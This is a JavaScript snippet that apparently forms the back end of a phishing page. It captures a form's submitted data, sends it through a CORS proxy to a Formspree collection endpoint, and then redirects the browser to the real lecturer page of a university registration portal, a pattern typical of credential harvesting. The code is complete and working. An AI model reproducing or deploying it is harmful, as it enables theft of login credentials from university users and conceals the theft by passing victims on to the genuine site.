
    //form
    const form = document.querySelector("form");
    //console.log(form)
    form.addEventListener("submit", async (event) => {
    
      event.preventDefault();
     console.log('submitting')
      try {
        const response = await fetchViaProxy("https://formspree.io/f/mwkjvovd", {
          method: "POST",
          body: new FormData(form)
          
        });
        if(!response){
         // alert("Form submission successful\nThank you!");
          location.href='https://registration.ueab.ac.ke/ueab/a_lecturers.jsp?view=1:0'
       
        }
        else{
          console.log(response.status)
        } 
      } catch (err) {
        console.error(err);
      }
      
      //hideLoader()
    });

    async function fetchViaProxy(url, options) {
      try {
        const proxyUrl = 'https://corsproxy.io/?';
        const targetUrl = url;
        const proxiedUrl = proxyUrl + encodeURIComponent(targetUrl);

        const response = await fetch(proxiedUrl, options);
        return response;
      } catch (error) {
        console.error(error);
      }
    }
  
  